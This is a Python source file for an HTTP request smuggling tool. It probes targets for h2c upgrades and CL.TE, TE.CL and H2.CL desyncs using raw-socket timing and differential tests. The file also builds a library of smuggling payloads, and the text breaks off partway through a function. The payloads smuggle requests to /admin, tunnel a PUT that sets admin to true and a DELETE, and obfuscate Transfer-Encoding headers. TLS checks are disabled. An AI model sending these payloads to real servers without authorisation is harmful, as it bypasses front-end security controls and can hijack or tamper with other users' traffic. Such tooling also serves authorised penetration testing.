#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - HTTP/2 Smuggling Engine (H2C)
=====================================================
Fused from: H2Csmuggler (https://github.com/BishopFox/h2csmuggler)
           + HTTP Request Smuggling research by James Kettle (PortSwigger)
           + Custom Zylon Techniques
Capabilities:
  - HTTP/2 cleartext (h2c) smuggling detection
  - CL.TE detection (Content-Length / Transfer-Encoding)
  - TE.CL detection (Transfer-Encoding / Content-Length)
  - H2.CL detection (HTTP/2 Content-Length)
  - H2.TE detection (HTTP/2 Transfer-Encoding)
  - Timing-based smuggling analysis
  - Differential response analysis
  - Request smuggling payload generation
  - HTTP method tunneling
  - Smuggling via upgrade headers
Termux Compatible | No Root Required | Python 3.13+
"""

import os
import sys
import json
import time
import socket
import ssl
import threading
import hashlib
from datetime import datetime
from urllib.parse import urlparse

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import (
    USER_AGENTS, DEFAULT_TIMEOUT, MAX_THREADS
)

from core.shared_infra import shared_session, regex_cache

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# H2C UPGRADE PATHS
# ============================================================================

H2C_UPGRADE_PATHS = [
    '/', '/index.html', '/api', '/login', '/auth',
    '/graphql', '/v1', '/v2', '/ws', '/websocket',
    '/health', '/status', '/ping',
]

# ============================================================================
# SMUGGLING PAYLOAD TEMPLATES
# ============================================================================

CLTE_PAYLOADS = [
    {
        "name": "CL.TE basic",
        "description": "Front-end uses CL, back-end uses TE. Smuggled request hidden in body.",
        "request": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: {cl}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GET /smuggled HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
        ),
    },
    {
        "name": "CL.TE with timing",
        "description": "CL.TE detection via timing - smuggled request causes delay.",
        "request": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: {cl}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GET /delayed HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "X-Delay: 10\r\n"
            "\r\n"
        ),
    },
    {
        "name": "CL.TE obfuscated TE",
        "description": "Obfuscated Transfer-Encoding header to bypass front-end.",
        "request": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: {cl}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: obfuscated\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GET /smuggled HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
        ),
    },
]

TECL_PAYLOADS = [
    {
        "name": "TE.CL basic",
        "description": "Front-end uses TE, back-end uses CL. Body contains smuggled request.",
        "request": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: {cl}\r\n"
            "\r\n"
            "{chunk_size}\r\n"
            "GET /smuggled HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "x=1\r\n"
            "0\r\n"
            "\r\n"
        ),
    },
    {
        "name": "TE.CL with timing",
        "description": "TE.CL detection via timing - smuggled incomplete request causes delay.",
        "request": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: {cl}\r\n"
            "\r\n"
            "{chunk_size}\r\n"
            "POST /login HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: 100\r\n"
            "\r\n"
            "x=\r\n"
            "0\r\n"
            "\r\n"
        ),
    },
]

H2CL_PAYLOADS = [
    {
        "name": "H2.CL basic",
        "description": "HTTP/2 front-end with CL, HTTP/1.1 back-end. Body contains smuggled request.",
        "request": (
            "GET {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: {cl}\r\n"
            "\r\n"
            "GET /admin HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
        ),
    },
]

H2TE_PAYLOADS = [
    {
        "name": "H2.TE basic",
        "description": "HTTP/2 front-end with TE header passed to HTTP/1.1 back-end.",
        "request": (
            "GET {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GET /admin HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
        ),
    },
]

METHOD_TUNNEL_PAYLOADS = [
    {
        "name": "Method tunneling - PUT via POST",
        "description": "Tunnel PUT request inside POST body",
        "method": "POST",
        "request": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: {cl}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "PUT /resource HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: 20\r\n"
            "\r\n"
            '{{"admin": true}}'
        ),
    },
    {
        "name": "Method tunneling - DELETE via GET",
        "description": "Tunnel DELETE request inside GET",
        "method": "GET",
        "request": (
            "GET {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: {cl}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "DELETE /resource/1 HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
        ),
    },
]

# ============================================================================
# UPGRADE HEADERS FOR H2C SMUGGLING
# ============================================================================

H2C_UPGRADE_HEADERS = [
    {
        "name": "h2c Upgrade",
        "headers": {
            "Upgrade": "h2c",
            "Connection": "Upgrade, HTTP2-Settings",
            "HTTP2-Settings": "AAMAAABkAAQBAAAAAAIAAAAA",
        },
    },
    {
        "name": "h2 Upgrade",
        "headers": {
            "Upgrade": "h2",
            "Connection": "Upgrade, HTTP2-Settings",
            "HTTP2-Settings": "AAMAAABkAAQBAAAAAAIAAAAA",
        },
    },
    {
        "name": "h2c via Connection header only",
        "headers": {
            "Connection": "Upgrade, h2c",
            "Upgrade": "h2c",
        },
    },
    {
        "name": "h2c with keep-alive",
        "headers": {
            "Upgrade": "h2c",
            "Connection": "keep-alive, Upgrade",
            "HTTP2-Settings": "AAMAAABkAAQBAAAAAAIAAAAA",
        },
    },
]


class H2CEngine:
    """HTTP/2 Smuggling Engine - Fused from H2Csmuggler + PortSwigger Research + Custom Techniques"""

    def __init__(self, timeout=DEFAULT_TIMEOUT, threads=MAX_THREADS, proxy=None):
        self.timeout = timeout
        self.threads = threads
        self.proxy = proxy
        self.session = shared_session
        self.lock = threading.Lock()

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    # ========================================================================
    # H2C DETECTION
    # ========================================================================

    def detect_h2c(self, target):
        """Detect h2c (HTTP/2 cleartext) support

        Tests if the target server supports HTTP/2 cleartext upgrades,
        which can be exploited for request smuggling.

        Args:
            target: Target URL or domain

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  H2C (HTTP/2 Cleartext) Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {target}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or 443

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "h2c_supported": False,
                "upgrade_paths": [],
                "tests_run": [],
            },
            "scan_type": "h2c_detection",
        }

        # Test 1: Check HTTP/2 ALPN negotiation
        self._print(f"  [*] Test 1: HTTP/2 ALPN negotiation...", CYAN)
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2', 'http/1.1'])

            sock = socket.create_connection((host, port), timeout=self.timeout)
            ssock = ctx.wrap_socket(sock, server_hostname=host)
            negotiated = ssock.selected_alpn_protocol()
            ssock.close()

            alpn_result = {"test": "alpn_negotiation", "negotiated": negotiated}
            result["details"]["tests_run"].append(alpn_result)

            if negotiated == 'h2':
                self._print(f"  [+] HTTP/2 supported via ALPN", GREEN)
                result["findings"].append({
                    "type": "h2_alpn_supported",
                    "severity": "Info",
                    "description": "Server supports HTTP/2 via ALPN negotiation",
                    "negotiated_protocol": negotiated,
                })
        except Exception as e:
            result["details"]["tests_run"].append({"test": "alpn", "error": str(e)[:100]})

        # Test 2: H2C upgrade requests
        self._print(f"  [*] Test 2: H2C upgrade requests...", CYAN)
        for path in H2C_UPGRADE_PATHS:
            for upgrade_config in H2C_UPGRADE_HEADERS:
                try:
                    test_url = f"http://{host}:{port}{path}"
                    if parsed.scheme == 'https':
                        test_url = f"https://{host}{path}"

                    resp = self.session.get(
                        test_url,
                        headers=upgrade_config["headers"],
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False,
                    )

                    # Check for 101 Switching Protocols
                    if resp.status_code == 101:
                        h2c_found = {
                            "path": path,
                            "upgrade_config": upgrade_config["name"],
                            "status_code": 101,
                            "response_headers": dict(resp.headers),
                        }
                        result["details"]["upgrade_paths"].append(h2c_found)
                        result["vulnerable"] = True
                        self._print(f"  [!!!] H2C upgrade accepted at {path} ({upgrade_config['name']})", RED)

                    # Check for h2c hints in response
                    upgrade_header = resp.headers.get('Upgrade', '')
                    connection_header = resp.headers.get('Connection', '')
                    if 'h2c' in upgrade_header.lower() or 'h2c' in connection_header.lower():
                        result["details"]["h2c_supported"] = True
                        self._print(f"  [+] H2C header detected at {path}", GREEN)

                except Exception:
                    pass

        # Test 3: Raw socket h2c upgrade
        self._print(f"  [*] Test 3: Raw socket h2c upgrade...", CYAN)
        for path in ['/', '/api']:
            try:
                sock = socket.create_connection((host, 80), timeout=self.timeout)
                upgrade_req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Upgrade: h2c\r\n"
                    f"Connection: Upgrade, HTTP2-Settings\r\n"
                    f"HTTP2-Settings: AAMAAABkAAQBAAAAAAIAAAAA\r\n"
                    f"\r\n"
                ).encode()
                sock.sendall(upgrade_req)
                resp_data = sock.recv(4096).decode('utf-8', errors='replace')
                sock.close()

                if '101' in resp_data and 'h2c' in resp_data.lower():
                    result["details"]["upgrade_paths"].append({
                        "path": path,
                        "method": "raw_socket",
                        "status_code": 101,
                    })
                    result["vulnerable"] = True
                    result["details"]["h2c_supported"] = True
                    self._print(f"  [!!!] H2C upgrade via raw socket at {path}", RED)
            except Exception:
                pass

        if result["vulnerable"]:
            result["findings"].append({
                "type": "h2c_smuggling_possible",
                "severity": "High",
                "description": f"Server accepts h2c upgrades at {len(result['details']['upgrade_paths'])} "
                              f"path(s). This enables HTTP/2 cleartext smuggling, allowing an attacker "
                              f"to bypass front-end security controls and access restricted endpoints.",
                "upgrade_paths": result["details"]["upgrade_paths"],
            })
        else:
            self._print(f"  [-] No h2c support detected", GREEN)

        return result

    # ========================================================================
    # CL.TE DETECTION
    # ========================================================================

    def detect_clte(self, target):
        """CL.TE smuggling detection

        Detects Content-Length / Transfer-Encoding discrepancies
        between front-end and back-end servers.

        Args:
            target: Target URL or domain

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  CL.TE Smuggling Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {target}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or 443

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "tests_run": [],
                "timing_results": [],
            },
            "scan_type": "clte_detection",
        }

        for payload_info in CLTE_PAYLOADS:
            self._print(f"  [*] Testing: {payload_info['name']}", CYAN)

            # Timing-based detection
            timing_result = self._timing_test_clte(
                host, port, parsed.path or '/', payload_info
            )
            result["details"]["timing_results"].append(timing_result)

            if timing_result.get("suspected"):
                result["vulnerable"] = True
                result["findings"].append({
                    "type": "clte_smuggling",
                    "severity": "Critical",
                    "description": f"CL.TE smuggling detected via {payload_info['name']}: "
                                  f"{payload_info['description']}. "
                                  f"Time difference: {timing_result.get('time_diff_ms', 0):.0f}ms",
                    "payload_name": payload_info["name"],
                    "time_diff_ms": timing_result.get("time_diff_ms", 0),
                })
                self._print(f"  [!!!] CL.TE DETECTED: {payload_info['name']}", RED)

            result["details"]["tests_run"].append({
                "payload": payload_info["name"],
                "suspected": timing_result.get("suspected", False),
            })

        if not result["vulnerable"]:
            self._print(f"  [-] No CL.TE smuggling detected", GREEN)

        return result

    def _timing_test_clte(self, host, port, path, payload_info):
        """Timing-based CL.TE detection"""
        result = {"suspected": False, "time_diff_ms": 0}

        try:
            # Normal request timing
            normal_times = []
            for _ in range(3):
                sock = socket.create_connection((host, port), timeout=self.timeout)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                normal_req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                start = time.time()
                sock.sendall(normal_req)
                sock.recv(4096)
                elapsed = time.time() - start
                normal_times.append(elapsed)
                sock.close()
                time.sleep(0.1)

            avg_normal = sum(normal_times) / len(normal_times) if normal_times else 1

            # Smuggled request timing
            smuggle_times = []
            for _ in range(3):
                sock = socket.create_connection((host, port), timeout=self.timeout)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                # Build CL.TE payload
                smuggled = f"GET /404check{int(time.time()*1000)} HTTP/1.1\r\nHost: {host}\r\n\r\n"
                body = f"0\r\n\r\n{smuggled}"
                cl = len(body.encode())

                payload_req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {cl}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{body}"
                ).encode()

                start = time.time()
                sock.sendall(payload_req)
                try:
                    sock.settimeout(5)
                    sock.recv(4096)
                    # Try to read second response (from smuggled request)
                    try:
                        sock.settimeout(3)
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                except Exception:
                    pass
                elapsed = time.time() - start
                smuggle_times.append(elapsed)
                sock.close()
                time.sleep(0.1)

            avg_smuggle = sum(smuggle_times) / len(smuggle_times) if smuggle_times else 0

            # If smuggled request takes significantly longer, CL.TE is suspected
            time_diff = (avg_smuggle - avg_normal) * 1000
            result["time_diff_ms"] = time_diff
            result["avg_normal_ms"] = avg_normal * 1000
            result["avg_smuggle_ms"] = avg_smuggle * 1000

            if time_diff > 500:  # Significant delay indicates smuggling
                result["suspected"] = True

        except Exception as e:
            result["error"] = str(e)[:100]

        return result

    # ========================================================================
    # TE.CL DETECTION
    # ========================================================================

    def detect_tecl(self, target):
        """TE.CL smuggling detection

        Detects Transfer-Encoding / Content-Length discrepancies
        between front-end and back-end servers.

        Args:
            target: Target URL or domain

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  TE.CL Smuggling Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {target}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or 443

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "tests_run": [],
                "timing_results": [],
            },
            "scan_type": "tecl_detection",
        }

        for payload_info in TECL_PAYLOADS:
            self._print(f"  [*] Testing: {payload_info['name']}", CYAN)

            timing_result = self._timing_test_tecl(
                host, port, parsed.path or '/', payload_info
            )
            result["details"]["timing_results"].append(timing_result)

            if timing_result.get("suspected"):
                result["vulnerable"] = True
                result["findings"].append({
                    "type": "tecl_smuggling",
                    "severity": "Critical",
                    "description": f"TE.CL smuggling detected via {payload_info['name']}: "
                                  f"{payload_info['description']}. "
                                  f"Time difference: {timing_result.get('time_diff_ms', 0):.0f}ms",
                    "payload_name": payload_info["name"],
                    "time_diff_ms": timing_result.get("time_diff_ms", 0),
                })
                self._print(f"  [!!!] TE.CL DETECTED: {payload_info['name']}", RED)

            result["details"]["tests_run"].append({
                "payload": payload_info["name"],
                "suspected": timing_result.get("suspected", False),
            })

        if not result["vulnerable"]:
            self._print(f"  [-] No TE.CL smuggling detected", GREEN)

        return result

    def _timing_test_tecl(self, host, port, path, payload_info):
        """Timing-based TE.CL detection"""
        result = {"suspected": False, "time_diff_ms": 0}

        try:
            # Normal request timing
            normal_times = []
            for _ in range(3):
                sock = socket.create_connection((host, port), timeout=self.timeout)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                normal_req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                start = time.time()
                sock.sendall(normal_req)
                sock.recv(4096)
                elapsed = time.time() - start
                normal_times.append(elapsed)
                sock.close()
                time.sleep(0.1)

            avg_normal = sum(normal_times) / len(normal_times) if normal_times else 1

            # TE.CL smuggled request
            smuggle_times = []
            for _ in range(3):
                sock = socket.create_connection((host, port), timeout=self.timeout)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                # Build TE.CL payload - incomplete request causes back-end to wait
                inner_req = (
                    f"POST /login HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Length: 100\r\n"
                    f"\r\n"
                    f"x="
                )
                chunk_size = format(len(inner_req), 'x')
                body = f"{chunk_size}\r\n{inner_req}\r\n0\r\n\r\n"

                payload_req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"\r\n"
                    f"{body}"
                ).encode()

                start = time.time()
                sock.sendall(payload_req)
                try:
                    sock.settimeout(8)
                    sock.recv(4096)
                except socket.timeout:
                    pass
                elapsed = time.time() - start
                smuggle_times.append(elapsed)
                sock.close()
                time.sleep(0.1)

            avg_smuggle = sum(smuggle_times) / len(smuggle_times) if smuggle_times else 0
            time_diff = (avg_smuggle - avg_normal) * 1000
            result["time_diff_ms"] = time_diff
            result["avg_normal_ms"] = avg_normal * 1000
            result["avg_smuggle_ms"] = avg_smuggle * 1000

            if time_diff > 1000:  # TE.CL typically shows longer delays
                result["suspected"] = True

        except Exception as e:
            result["error"] = str(e)[:100]

        return result

    # ========================================================================
    # H2.CL DETECTION
    # ========================================================================

    def detect_h2cl(self, target):
        """H2.CL detection (HTTP/2 Content-Length smuggling)

        Detects if an HTTP/2 front-end passes a Content-Length header
        to an HTTP/1.1 back-end, enabling request smuggling.

        Args:
            target: Target URL or domain

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  H2.CL Smuggling Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {target}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"
        parsed = urlparse(url)
        host = parsed.hostname

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "tests_run": [],
            },
            "scan_type": "h2cl_detection",
        }

        # Test 1: Check if server is behind HTTP/2 proxy
        self._print(f"  [*] Checking for HTTP/2 front-end...", CYAN)
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            if resp.raw.version == 11:
                # HTTP/1.1 response - may be behind HTTP/2 proxy
                self._print(f"  [*] HTTP/1.1 response detected - checking for H2 proxy", DIM + CYAN)
        except Exception:
            pass

        # Test 2: Differential response analysis
        self._print(f"  [*] Running differential response analysis...", CYAN)
        diff_result = self._differential_analysis(url, 'h2cl')
        result["details"]["differential"] = diff_result

        if diff_result.get("differential_detected"):
            result["vulnerable"] = True
            result["findings"].append({
                "type": "h2cl_smuggling",
                "severity": "High",
                "description": "H2.CL smuggling suspected via differential response analysis. "
                              "The server may be passing Content-Length from HTTP/2 to HTTP/1.1 back-end.",
                "evidence": diff_result.get("evidence", ""),
            })

        if not result["vulnerable"]:
            self._print(f"  [-] No H2.CL smuggling detected", GREEN)

        return result

    # ========================================================================
    # TIMING ANALYSIS
    # ========================================================================

    def timing_analysis(self, target):
        """Timing-based smuggling analysis

        Comprehensive timing analysis to detect all forms of
        HTTP request smuggling through response time differences.

        Args:
            target: Target URL or domain

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  HTTP Smuggling Timing Analysis{RESET}", CYAN)
        self._print(f"  [*] Target: {target}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or 443
        path = parsed.path or '/'

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "baseline_ms": 0,
                "clte_timing_ms": 0,
                "tecl_timing_ms": 0,
                "analysis": [],
            },
            "scan_type": "smuggling_timing",
        }

        # Baseline measurement
        self._print(f"  [*] Measuring baseline response times...", CYAN)
        baseline_times = []
        for i in range(5):
            try:
                sock = socket.create_connection((host, port), timeout=self.timeout)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
                start = time.time()
                sock.sendall(req)
                sock.recv(4096)
                elapsed = (time.time() - start) * 1000
                baseline_times.append(elapsed)
                sock.close()
                time.sleep(0.2)
            except Exception:
                pass

        avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 100
        result["details"]["baseline_ms"] = round(avg_baseline, 2)

        self._print(f"  [*] Baseline: {avg_baseline:.1f}ms avg", CYAN)

        # Test 1: CL.TE timing
        self._print(f"  [*] CL.TE timing test...", CYAN)
        clte_times = []
        for i in range(5):
            try:
                sock = socket.create_connection((host, port), timeout=self.timeout)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                smuggled = f"GET /timetest{i} HTTP/1.1\r\nHost: {host}\r\n\r\n"
                body = f"0\r\n\r\n{smuggled}"
                cl = len(body.encode())

                req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Length: {cl}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{body}"
                ).encode()

                start = time.time()
                sock.sendall(req)
                sock.settimeout(5)
                try:
                    sock.recv(4096)
                except socket.timeout:
                    pass
                elapsed = (time.time() - start) * 1000
                clte_times.append(elapsed)
                sock.close()
                time.sleep(0.2)
            except Exception:
                pass

        avg_clte = sum(clte_times) / len(clte_times) if clte_times else 0
        result["details"]["clte_timing_ms"] = round(avg_clte, 2)

        clte_diff = avg_clte - avg_baseline
        self._print(f"  [*] CL.TE avg: {avg_clte:.1f}ms (diff: {clte_diff:.1f}ms)", CYAN)

        if clte_diff > 500:
            result["vulnerable"] = True
            result["findings"].append({
                "type": "clte_timing_anomaly",
                "severity": "High",
                "description": f"CL.TE timing anomaly detected: {clte_diff:.0f}ms slower than baseline. "
                              f"This indicates the back-end server may be processing a smuggled request.",
                "baseline_ms": round(avg_baseline, 2),
                "clte_ms": round(avg_clte, 2),
                "diff_ms": round(clte_diff, 2),
            })
            result["details"]["analysis"].append({
                "type": "CL.TE",
                "suspected": True,
                "diff_ms": round(clte_diff, 2),
            })

        # Test 2: TE.CL timing
        self._print(f"  [*] TE.CL timing test...", CYAN)
        tecl_times = []
        for i in range(5):
            try:
                sock = socket.create_connection((host, port), timeout=self.timeout)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                inner_req = (
                    f"POST /timeout-test HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Length: 100\r\n"
                    f"\r\n"
                    f"x="
                )
                chunk_size = format(len(inner_req), 'x')
                body = f"{chunk_size}\r\n{inner_req}\r\n0\r\n\r\n"

                req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"\r\n"
                    f"{body}"
                ).encode()

                start = time.time()
                sock.sendall(req)
                sock.settimeout(8)
                try:
                    sock.recv(4096)
                except socket.timeout:
                    pass
                elapsed = (time.time() - start) * 1000
                tecl_times.append(elapsed)
                sock.close()
                time.sleep(0.2)
            except Exception:
                pass

        avg_tecl = sum(tecl_times) / len(tecl_times) if tecl_times else 0
        result["details"]["tecl_timing_ms"] = round(avg_tecl, 2)

        tecl_diff = avg_tecl - avg_baseline
        self._print(f"  [*] TE.CL avg: {avg_tecl:.1f}ms (diff: {tecl_diff:.1f}ms)", CYAN)

        if tecl_diff > 1000:
            result["vulnerable"] = True
            result["findings"].append({
                "type": "tecl_timing_anomaly",
                "severity": "High",
                "description": f"TE.CL timing anomaly detected: {tecl_diff:.0f}ms slower than baseline. "
                              f"This indicates the back-end server may be waiting for request body "
                              f"(Content-Length starvation).",
                "baseline_ms": round(avg_baseline, 2),
                "tecl_ms": round(avg_tecl, 2),
                "diff_ms": round(tecl_diff, 2),
            })
            result["details"]["analysis"].append({
                "type": "TE.CL",
                "suspected": True,
                "diff_ms": round(tecl_diff, 2),
            })

        if not result["vulnerable"]:
            self._print(f"  [-] No timing anomalies detected", GREEN)

        return result

    # ========================================================================
    # PAYLOAD GENERATION
    # ========================================================================

    def generate_smuggle_payloads(self):
        """Generate request smuggling payloads

        Returns a comprehensive list of request smuggling payloads
        for manual testing and verification.

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Smuggling Payload Generation{RESET}", CYAN)

        all_payloads = []

        # CL.TE payloads
        for p in CLTE_PAYLOADS:
            all_payloads.append({
                "category": "CL.TE",
                "name": p["name"],
                "description": p["description"],
                "template": p["request"],
            })

        # TE.CL payloads
        for p in TECL_PAYLOADS:
            all_payloads.append({
                "category": "TE.CL",
                "name": p["name"],
                "description": p["description"],
                "template": p["request"],
            })

        # H2.CL payloads
        for p in H2CL_PAYLOADS:
            all_payloads.append({
                "category": "H2.CL",
                "name": p["name"],
                "description": p["description"],
                "template": p["request"],
            })

        # H2.TE payloads
        for p in H2TE_PAYLOADS:
            all_payloads.append({
                "category": "H2.TE",
                "name": p["name"],
                "description": p["description"],
                "template": p["request"],
            })

        # Method tunneling
        for p in METHOD_TUNNEL_PAYLOADS:
            all_payloads.append({
                "category": "Method_Tunneling",
                "name": p["name"],
                "description": p["description"],
                "template": p["request"],
            })

        # Additional obfuscation techniques
        obfuscation_payloads = [
            {
                "category": "Obfuscation",
                "name": "Transfer-Encoding whitespace",
                "description": "Transfer-Encoding with various whitespace obfuscation",
                "template": "Transfer-Encoding: \tchunked\r\n",
            },
            {
                "category": "Obfuscation",
                "name": "Transfer-Encoding mixed case",
                "description": "Mixed case Transfer-Encoding header",
                "template": "Transfer-Encoding: ChUnKeD\r\n",
            },
            {
                "category": "Obfuscation",
                "name": "Double Content-Length",
                "description": "Two Content-Length headers with different values",
                "template": "Content-Length: 0\r\nContent-Length: 50\r\n",
            },
            {
                "category": "Obfuscation",
                "name": "TE with comma",
                "description": "Transfer-Encoding with comma-separated values",
                "template": "Transfer-Encoding: chunked, identity\r\n",
            },
        ]
        all_payloads.extend(obfuscation_payloads)

        self._print(f"  [+] Generated {len(all_payloads)} smuggling payloads", GREEN)

        return {
            'vulnerable': False,
            'findings': [],
            'details': {
                'total_payloads': len(all_payloads),
                'categories': list(set(p['category'] for p in all_payloads)),
                'payloads': all_payloads,
            },
            'scan_type': 'smuggle_payload_gen',
        }

    # ========================================================================
    # DIFFERENTIAL RESPONSE ANALYSIS
    # ========================================================================

    def _differential_analysis(self, url, smuggling_type):
        """Perform differential response analysis for smuggling detection"""
        result = {"differential_detected": False, "evidence": ""}

        try:
            parsed = urlparse(url)
            host = parsed.hostname

            # Normal request
            resp1 = self.session.get(url, timeout=self.timeout, verify=False)
            normal_status = resp1.status_code
            normal_len = len(resp1.content)

            # Request with smuggled prefix
            smuggle_headers = {}
            if smuggling_type == 'h2cl':
                smuggle_headers = {
                    'Content-Length': '0',
                    'X-Smuggle-Test': 'true',
                }
            elif smuggling_type == 'h2te':
                smuggle_headers = {
                    'Transfer-Encoding': 'chunked',
                    'X-Smuggle-Test': 'true',
                }

            resp2 = self.session.get(url, headers=smuggle_headers,
